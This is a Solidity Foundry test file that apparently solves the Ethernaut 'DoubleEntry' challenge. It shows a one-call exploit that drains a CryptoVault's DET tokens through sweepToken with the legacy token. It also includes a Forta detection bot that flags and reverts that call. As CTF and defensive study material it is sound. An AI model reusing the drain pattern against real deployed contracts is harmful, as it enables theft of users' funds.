// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import '../../src/EthernautCTF/DoubleEntry.sol';
import '@forge-std/Test.sol';
import '@forge-std/console.sol';

contract Bot is IDetectionBot {
  address vaultAddress;
  Forta forta;
  address playerAddress;

  constructor(
    address _vaultAddress,
    address _fortaAddress,
    address _playerAddress
  ) {
    vaultAddress = _vaultAddress;
    forta = Forta(_fortaAddress);
    playerAddress = _playerAddress;
  }

  function handleTransaction(address user, bytes calldata msgData) external {
    // We monitor calls made to the DET contract.
    // We should make sure that the CryptoVault does not call this function.
    (, , address origSender) = abi.decode(
      msgData[4:],
      (address, uint256, address)
    );

    // $ cast sig "delegateTransfer(address,uint256,address)"
    // 0x9cd1a121
    bytes4 delegateTransferSig = bytes4(0x9cd1a121);
    bytes4 sig = bytes4(msgData);

    if (sig == delegateTransferSig && origSender == vaultAddress) {
      // Check that the signature is the delegateTransfer method signature.
      // Also check that the origin sender is the vault address.
      console.log('Exploit detected by the bot!');
      forta.raiseAlert(playerAddress);
    }
  }
}

contract DoubleEntryExploit is Test {
  CryptoVault target;
  DoubleEntryPoint doubleEntryToken;
  LegacyToken legacyToken;
  Forta forta;

  address deployerAddress = makeAddr('deployer');
  address sweptTokenRecipientAddress = makeAddr('sweptTokenRecipient');
  address playerAddress = makeAddr('player');
  address exploiterAddress = makeAddr('exploiter');

  function setUp() public {
    vm.startPrank(deployerAddress);
    target = new CryptoVault(sweptTokenRecipientAddress);
    console.log('Target contract deployed');

    legacyToken = new LegacyToken();
    legacyToken.mint(address(target), 100 ether);
    console.log('Legacy token contract deployed');

    forta = new Forta();
    console.log('Forta contract deployed');

    doubleEntryToken = new DoubleEntryPoint(
      address(legacyToken),
      address(target),
      address(forta),
      playerAddress
    );
    console.log('DoubleEntry token contract deployed');

    legacyToken.delegateToNewContract(doubleEntryToken);
    console.log('Legacy token delegate to DoubleEntry token');

    target.setUnderlying(address(doubleEntryToken));
    console.log('CryptoVault underlying  token set to the DoubleEntry token');

    vm.stopPrank();
  }

  function testExploit() public {
    console.log(); // break line

    uint256 vaultDETBalance = doubleEntryToken.balanceOf(address(target));
    console.log('Vault DET balance: %d units', vaultDETBalance / 1 ether);
    assertEq(vaultDETBalance, 100 ether);

    uint256 vaultLGTBalance = legacyToken.balanceOf(address(target));
    console.log('Vault LGT balance: %d units', vaultLGTBalance / 1 ether);
    assertEq(vaultLGTBalance, 100 ether);

    vm.startPrank(exploiterAddress);
    // The goal of this exploit is to drain all the DET tokens from the CryptoVault.
    console.log(
      'Sweep the LGT tokens which in fact will sweep the DET tokens from the CryptoVault'
    );
    target.sweepToken(legacyToken);
    console.log('The CryptoVault DET tokens have been drained');
    vm.stopPrank();

    vaultDETBalance = doubleEntryToken.balanceOf(address(target));
    console.log('Vault DET balance: %d units', vaultDETBalance / 1 ether);
    assertEq(vaultDETBalance, 0);

    vaultLGTBalance = legacyToken.balanceOf(address(target));
    console.log('Vault LGT balance: %d units', vaultLGTBalance / 1 ether);
    assertEq(vaultLGTBalance, 100 ether);
  }

  function testPreventExploitWithForta() public {
    console.log(); // break line

    // Set up Forta bot.
    vm.startPrank(playerAddress);
    Bot bot = new Bot(address(target), address(forta), playerAddress);
    forta.setDetectionBot(address(bot));
    vm.stopPrank();

    uint256 vaultDETBalance = doubleEntryToken.balanceOf(address(target));
    console.log('Vault DET balance: %d units', vaultDETBalance / 1 ether);
    assertEq(vaultDETBalance, 100 ether);

    uint256 vaultLGTBalance = legacyToken.balanceOf(address(target));
    console.log('Vault LGT balance: %d units', vaultLGTBalance / 1 ether);
    assertEq(vaultLGTBalance, 100 ether);

    vm.startPrank(exploiterAddress);
    // The goal of this exploit is to drain all the DET tokens from the CryptoVault.
    console.log(
      'Sweep the LGT tokens which in fact will sweep the DET tokens from the CryptoVault'
    );
    vm.expectRevert('Alert has been triggered, reverting');
    target.sweepToken(legacyToken);
    console.log('The exploit call has been reverted by Forta');
    console.log('The CryptoVault DET tokens have not been drained');
    vm.stopPrank();

    vaultDETBalance = doubleEntryToken.balanceOf(address(target));
    console.log('Vault DET balance: %d units', vaultDETBalance / 1 ether);
    assertEq(vaultDETBalance, 100 ether);

    vaultLGTBalance = legacyToken.balanceOf(address(target));
    console.log('Vault LGT balance: %d units', vaultLGTBalance / 1 ether);
    assertEq(vaultLGTBalance, 100 ether);
  }
}
